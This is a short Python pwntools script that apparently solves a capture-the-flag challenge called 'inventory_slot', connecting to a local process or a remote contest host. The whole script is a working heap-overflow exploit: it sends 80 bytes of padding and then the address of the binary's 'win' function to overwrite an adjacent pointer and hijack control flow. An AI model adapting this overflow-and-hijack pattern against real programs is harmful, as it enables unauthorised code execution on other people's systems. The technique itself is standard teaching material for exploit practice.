#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./inventory_slot', checksec=False)

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13581)
    return process(elf.path)

p = conn()

OFFSET_TO_DISPLAY = 80      # 64 B note data + 8 B prev_size + 8 B size
WIN               = elf.sym.win

payload = flat(
    b'A' * OFFSET_TO_DISPLAY,
    p64(WIN),
)

p.sendafter(b'content: ', payload)
print(p.recvall(timeout=1).decode(errors='replace'))